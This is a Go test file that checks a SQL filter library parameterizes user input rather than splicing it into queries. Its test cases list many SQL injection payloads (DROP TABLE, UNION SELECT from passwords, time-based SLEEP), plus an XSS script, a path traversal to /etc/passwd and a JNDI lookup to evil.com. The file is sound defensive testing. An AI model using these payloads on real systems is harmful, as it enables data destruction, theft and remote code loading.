// Copyright 2022 The codesjoy Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package aipsql

import (
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSQLInjectionProtection_CommonAttackPatterns tests that common SQL injection
// attack patterns are properly parameterized and do not appear in generated SQL.
//
// **Validates: Requirements 8.1, 8.2**
func TestSQLInjectionProtection_CommonAttackPatterns(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			Filterable().
			Build(),
		NewColumn().
			WithFieldPath("email").
			WithDatabaseName("db_email").
			Filterable().
			Build(),
	).Build()

	testCases := []struct {
		name           string
		filter         string
		expectedValue  string
		dangerousToken string
		description    string
	}{
		{
			name:           "DROP TABLE injection",
			filter:         `name="'; DROP TABLE users; --"`,
			expectedValue:  "'; DROP TABLE users; --",
			dangerousToken: "DROP TABLE",
			description:    "Classic SQL injection attempting to drop tables",
		},
		{
			name:           "OR 1=1 injection",
			filter:         `name="' OR '1'='1"`,
			expectedValue:  "' OR '1'='1",
			dangerousToken: "OR '1'='1'",
			description:    "Tautology-based injection to bypass authentication",
		},
		{
			name:           "UNION SELECT injection",
			filter:         `name="' UNION SELECT * FROM passwords--"`,
			expectedValue:  "' UNION SELECT * FROM passwords--",
			dangerousToken: "UNION SELECT",
			description:    "UNION-based injection to extract data from other tables",
		},
		{
			name:           "Comment injection",
			filter:         `name="admin'--"`,
			expectedValue:  "admin'--",
			dangerousToken: "--",
			description:    "Comment-based injection to bypass WHERE conditions",
		},
		{
			name:           "Stacked queries injection",
			filter:         `name="'; DELETE FROM users WHERE '1'='1"`,
			expectedValue:  "'; DELETE FROM users WHERE '1'='1",
			dangerousToken: "DELETE FROM",
			description:    "Stacked queries to execute multiple statements",
		},
		{
			name:           "Hex encoding injection",
			filter:         `name="0x61646D696E"`,
			expectedValue:  "0x61646D696E",
			dangerousToken: "0x",
			description:    "Hex-encoded values to bypass filters",
		},
		{
			name:           "Time-based blind injection",
			filter:         `name="' OR SLEEP(5)--"`,
			expectedValue:  "' OR SLEEP(5)--",
			dangerousToken: "SLEEP",
			description:    "Time-based blind SQL injection",
		},
		{
			name:           "Boolean-based blind injection",
			filter:         `name="' AND 1=1--"`,
			expectedValue:  "' AND 1=1--",
			dangerousToken: "AND 1=1",
			description:    "Boolean-based blind SQL injection",
		},
		{
			name:           "Subquery injection",
			filter:         `name="' OR (SELECT COUNT(*) FROM users) > 0--"`,
			expectedValue:  "' OR (SELECT COUNT(*) FROM users) > 0--",
			dangerousToken: "SELECT COUNT",
			description:    "Subquery-based injection",
		},
		{
			name:           "INSERT injection",
			filter:         `name="'; INSERT INTO users VALUES ('hacker', 'pass')--"`,
			expectedValue:  "'; INSERT INTO users VALUES ('hacker', 'pass')--",
			dangerousToken: "INSERT INTO",
			description:    "INSERT-based injection to add malicious data",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			filter, err := ParseFilter(tc.filter)
			require.NoError(t, err, "Filter should parse successfully")

			sql, params, err := table.WhereClause(filter, "p_")
			require.NoError(t, err, "SQL generation should succeed")

			// Verify dangerous token is NOT in SQL
			assert.NotContains(t, sql, tc.dangerousToken,
				"Dangerous SQL token should not appear in generated SQL: %s", tc.description)

			// Verify the malicious input is safely stored in parameters
			require.NotEmpty(t, params, "Should have parameters")
			found := false
			for _, param := range params {
				if strVal, ok := param.Value.(string); ok {
					if strVal == tc.expectedValue {
						found = true
						break
					}
				}
			}
			assert.True(t, found, "Malicious input should be safely stored in parameters")

			// Verify SQL uses parameterized queries
			assert.Contains(t, sql, "@", "SQL should use parameterized queries")
		})
	}
}

// TestSQLInjectionProtection_HasOperator tests SQL injection protection
// specifically for the has (:) operator with different match modes.
//
// **Validates: Requirements 8.1, 8.2**
func TestSQLInjectionProtection_HasOperator(t *testing.T) {
	testCases := []struct {
		name       string
		matchModes []MatchMode
		dialect    SQLDialect
		filter     string
		malicious  string
	}{
		{
			name:       "exact mode with injection",
			matchModes: []MatchMode{MatchModeExact},
			dialect:    SQLDialectGeneric,
			filter:     `name:"'; DROP TABLE users; --"`,
			malicious:  "DROP TABLE",
		},
		{
			name:       "prefix mode with injection",
			matchModes: []MatchMode{MatchModePrefix},
			dialect:    SQLDialectGeneric,
			filter:     `name:"' OR '1'='1"`,
			malicious:  "OR '1'='1'",
		},
		{
			name:       "contains mode with injection",
			matchModes: []MatchMode{MatchModeContains},
			dialect:    SQLDialectGeneric,
			filter:     `name:"' UNION SELECT"`,
			malicious:  "UNION SELECT",
		},
		{
			name:       "fulltext postgres with injection",
			matchModes: []MatchMode{MatchModeFullText},
			dialect:    SQLDialectPostgres,
			filter:     `name:"'; DELETE FROM users--"`,
			malicious:  "DELETE FROM",
		},
		{
			name:       "fulltext mysql with injection",
			matchModes: []MatchMode{MatchModeFullText},
			dialect:    SQLDialectMySQL,
			filter:     `name:"' OR SLEEP(5)--"`,
			malicious:  "SLEEP",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			table := NewTable().WithColumns(
				NewColumn().
					WithFieldPath("name").
					WithDatabaseName("db_name").
					WithMatchModes(tc.matchModes...).
					Filterable().
					Build(),
			).Build()

			filter, err := ParseFilter(tc.filter)
			require.NoError(t, err)

			sql, params, err := table.WhereClauseWithOptions(filter, "p_", WhereClauseOptions{
				Dialect: tc.dialect,
			})
			require.NoError(t, err)

			// Verify malicious content is NOT in SQL
			assert.NotContains(t, sql, tc.malicious,
				"Malicious content should not appear in SQL")

			// Verify parameters are used
			assert.NotEmpty(t, params, "Should have parameters")
			assert.Contains(t, sql, "@", "SQL should use parameterized queries")
		})
	}
}

// TestSQLInjectionProtection_ImplicitFilters tests SQL injection protection
// for implicit filters with multiple columns.
//
// **Validates: Requirements 8.1, 8.2**
func TestSQLInjectionProtection_ImplicitFilters(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			FilterableImplicitly().
			Build(),
		NewColumn().
			WithFieldPath("title").
			WithDatabaseName("db_title").
			FilterableImplicitly().
			Build(),
		NewColumn().
			WithFieldPath("description").
			WithDatabaseName("db_description").
			FilterableImplicitly().
			Build(),
	).Build()

	maliciousInputs := []string{
		`"'; DROP TABLE users; --"`,
		`"' OR '1'='1"`,
		`"' UNION SELECT * FROM passwords--"`,
		`"admin'--"`,
		`"'; DELETE FROM users WHERE '1'='1"`,
	}

	for _, input := range maliciousInputs {
		t.Run(fmt.Sprintf("input=%s", input), func(t *testing.T) {
			filter, err := ParseFilter(input)
			require.NoError(t, err)

			sql, params, err := table.WhereClause(filter, "p_")
			require.NoError(t, err)

			// Extract the actual malicious value (remove quotes)
			maliciousValue := strings.Trim(input, `"`)

			// Verify malicious value is NOT directly in SQL
			assert.NotContains(t, sql, maliciousValue,
				"Malicious value should not be directly in SQL")

			// Verify SQL uses parameterized queries
			assert.Contains(t, sql, "@", "SQL should use parameterized queries")

			// Verify malicious value is in parameters
			found := false
			for _, param := range params {
				if strVal, ok := param.Value.(string); ok {
					if strings.Contains(strVal, maliciousValue) {
						found = true
						break
					}
				}
			}
			assert.True(t, found, "Malicious input should be in parameters")
		})
	}
}

// TestSQLInjectionProtection_KeyValueColumns tests SQL injection protection
// for Key-Value columns using UNNEST subqueries.
//
// **Validates: Requirements 8.1, 8.2, 3.5**
func TestSQLInjectionProtection_KeyValueColumns(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("labels").
			WithDatabaseName("db_labels").
			KeyValue().
			Filterable().
			Build(),
	).Build()

	testCases := []struct {
		name      string
		filter    string
		malicious string
	}{
		{
			name:      "injection in key",
			filter:    `labels."'; DROP TABLE users; --":"value"`,
			malicious: "DROP TABLE",
		},
		{
			name:      "injection in value",
			filter:    `labels.env:"' OR '1'='1"`,
			malicious: "OR '1'='1'",
		},
		{
			name:      "UNION injection in value",
			filter:    `labels.env:"' UNION SELECT * FROM passwords--"`,
			malicious: "UNION SELECT",
		},
		{
			name:      "comment injection in key",
			filter:    `labels."admin'--":"test"`,
			malicious: "--",
		},
		{
			name:      "DELETE injection in value",
			filter:    `labels.env:"'; DELETE FROM users WHERE '1'='1"`,
			malicious: "DELETE FROM",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			filter, err := ParseFilter(tc.filter)
			if err != nil {
				// Some malicious inputs might fail parsing, which is acceptable
				t.Skipf("Filter parsing failed (acceptable): %v", err)
				return
			}

			sql, params, err := table.WhereClause(filter, "p_")
			if err != nil {
				// Errors are acceptable for malicious input
				t.Skipf("SQL generation failed (acceptable): %v", err)
				return
			}

			// Verify malicious content is NOT in SQL
			assert.NotContains(t, sql, tc.malicious,
				"Malicious content should not appear in SQL")

			// Verify SQL uses parameterized queries in UNNEST subquery
			assert.Contains(t, sql, "EXISTS", "Should use EXISTS subquery")
			assert.Contains(t, sql, "UNNEST", "Should use UNNEST")
			assert.Contains(t, sql, "@", "Should use parameterized queries")

			// Verify parameters exist
			assert.NotEmpty(t, params, "Should have parameters")
		})
	}
}

// TestSQLInjectionProtection_LikeEscaping tests that LIKE special characters
// are properly escaped to prevent pattern injection.
//
// **Validates: Requirements 8.5**
func TestSQLInjectionProtection_LikeEscaping(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			WithMatchModes(MatchModePrefix).
			Filterable().
			Build(),
	).Build()

	testCases := []struct {
		name          string
		input         string
		shouldContain string
		description   string
	}{
		{
			name:          "percent sign",
			input:         "test%value",
			shouldContain: `test\%value`,
			description:   "Percent signs should be escaped in LIKE patterns",
		},
		{
			name:          "underscore",
			input:         "test_value",
			shouldContain: `test\_value`,
			description:   "Underscores should be escaped in LIKE patterns",
		},
		{
			name:          "wildcard injection attempt",
			input:         "%%",
			shouldContain: `\%\%`,
			description:   "Wildcard injection should be prevented",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			filter, err := ParseFilter(fmt.Sprintf(`name:"%s"`, tc.input))
			require.NoError(t, err)

			sql, params, err := table.WhereClause(filter, "p_")
			require.NoError(t, err)

			// Verify SQL uses LIKE
			assert.Contains(t, sql, "LIKE", "Should use LIKE for prefix mode")

			// Verify parameter value has escaped special characters
			require.NotEmpty(t, params, "Should have parameters")
			paramValue, ok := params[0].Value.(string)
			require.True(t, ok, "Parameter value should be string")
			assert.Contains(t, paramValue, tc.shouldContain,
				"Parameter should contain escaped value: %s", tc.description)
		})
	}
}

// TestSQLInjectionProtection_ComparisonOperators tests SQL injection protection
// for various comparison operators (=, !=, >, <, >=, <=).
//
// **Validates: Requirements 8.1, 8.2**
func TestSQLInjectionProtection_ComparisonOperators(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			Filterable().
			Build(),
		NewColumn().
			WithFieldPath("age").
			WithDatabaseName("db_age").
			Filterable().
			Build(),
	).Build()

	testCases := []struct {
		name      string
		filter    string
		malicious string
	}{
		{
			name:      "equals with injection",
			filter:    `name="' OR '1'='1"`,
			malicious: "OR '1'='1'",
		},
		{
			name:      "not equals with injection",
			filter:    `name!="'; DROP TABLE users; --"`,
			malicious: "DROP TABLE",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			filter, err := ParseFilter(tc.filter)
			require.NoError(t, err)

			sql, params, err := table.WhereClause(filter, "p_")
			require.NoError(t, err)

			// Verify malicious content is NOT in SQL
			assert.NotContains(t, sql, tc.malicious,
				"Malicious content should not appear in SQL")

			// Verify SQL uses parameterized queries
			assert.Contains(t, sql, "@", "SQL should use parameterized queries")
			assert.NotEmpty(t, params, "Should have parameters")
		})
	}
}

// TestSQLInjectionProtection_ComplexFilters tests SQL injection protection
// for complex filters with AND/OR logic.
//
// **Validates: Requirements 8.1, 8.2**
func TestSQLInjectionProtection_ComplexFilters(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			Filterable().
			Build(),
		NewColumn().
			WithFieldPath("email").
			WithDatabaseName("db_email").
			Filterable().
			Build(),
		NewColumn().
			WithFieldPath("status").
			WithDatabaseName("db_status").
			Filterable().
			Build(),
	).Build()

	testCases := []struct {
		name      string
		filter    string
		malicious []string
	}{
		{
			name:      "AND with multiple injections",
			filter:    `name="'; DROP TABLE users; --" AND email="' OR '1'='1"`,
			malicious: []string{"DROP TABLE", "OR '1'='1'"},
		},
		{
			name:      "OR with multiple injections",
			filter:    `name="' UNION SELECT" OR status="'; DELETE FROM users--"`,
			malicious: []string{"UNION SELECT", "DELETE FROM"},
		},
		{
			name:      "nested logic with injection",
			filter:    `(name="admin'--" OR email="test") AND status="' OR SLEEP(5)--"`,
			malicious: []string{"admin'--", "SLEEP"},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			filter, err := ParseFilter(tc.filter)
			require.NoError(t, err)

			sql, params, err := table.WhereClause(filter, "p_")
			require.NoError(t, err)

			// Verify all malicious content is NOT in SQL
			for _, mal := range tc.malicious {
				assert.NotContains(t, sql, mal,
					"Malicious content should not appear in SQL: %s", mal)
			}

			// Verify SQL uses parameterized queries
			assert.Contains(t, sql, "@", "SQL should use parameterized queries")
			assert.NotEmpty(t, params, "Should have parameters")
		})
	}
}

// TestSQLInjectionProtection_ColumnNamesFromSchema tests that column names
// in generated SQL only come from the table schema, not user input.
//
// **Validates: Requirements 8.3**
func TestSQLInjectionProtection_ColumnNamesFromSchema(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			Filterable().
			Build(),
		NewColumn().
			WithFieldPath("email").
			WithDatabaseName("db_email").
			Filterable().
			Build(),
	).Build()

	filter, err := ParseFilter(`name="test" AND email="user@example.com"`)
	require.NoError(t, err)

	sql, params, err := table.WhereClause(filter, "p_")
	require.NoError(t, err)

	// Verify SQL contains only schema-defined column names
	assert.Contains(t, sql, "db_name", "Should use schema-defined column name")
	assert.Contains(t, sql, "db_email", "Should use schema-defined column name")

	// Verify SQL does NOT contain unescaped field paths as column names
	// (the SQL should use db_name and db_email, not name and email as column names)
	assert.NotRegexp(t, `\bname\s*=`, sql, "Should not use 'name' as column name")
	assert.NotRegexp(t, `\bemail\s*=`, sql, "Should not use 'email' as column name")

	// Verify all values are parameterized
	assert.Equal(t, 2, len(params), "Should have 2 parameters")
	for _, param := range params {
		assert.Contains(t, sql, param.Name, "Parameter should be referenced in SQL")
	}
}

// TestSQLInjectionProtection_NoDirectStringConcatenation tests that
// user input is never directly concatenated into SQL strings.
//
// **Validates: Requirements 8.1, 8.2**
func TestSQLInjectionProtection_NoDirectStringConcatenation(t *testing.T) {
	table := NewTable().WithColumns(
		NewColumn().
			WithFieldPath("name").
			WithDatabaseName("db_name").
			Filterable().
			Build(),
	).Build()

	// Test various input values that should all be parameterized
	testValues := []string{
		"normal value",
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"' UNION SELECT * FROM passwords--",
		"admin'--",
		"<script>alert('xss')</script>",
		"../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
	}

	for _, value := range testValues {
		t.Run(fmt.Sprintf("value=%s", value), func(t *testing.T) {
			filter, err := ParseFilter(fmt.Sprintf(`name="%s"`, value))
			require.NoError(t, err)

			sql, params, err := table.WhereClause(filter, "p_")
			require.NoError(t, err)

			// Verify the value is NOT directly in SQL
			assert.NotContains(t, sql, value,
				"User input should not be directly in SQL")

			// Verify the value IS in parameters
			found := false
			for _, param := range params {
				if param.Value == value {
					found = true
					break
				}
			}
			assert.True(t, found, "User input should be in parameters")

			// Verify SQL uses parameterized query format
			assert.Contains(t, sql, "@", "SQL should use parameterized queries")
		})
	}
}
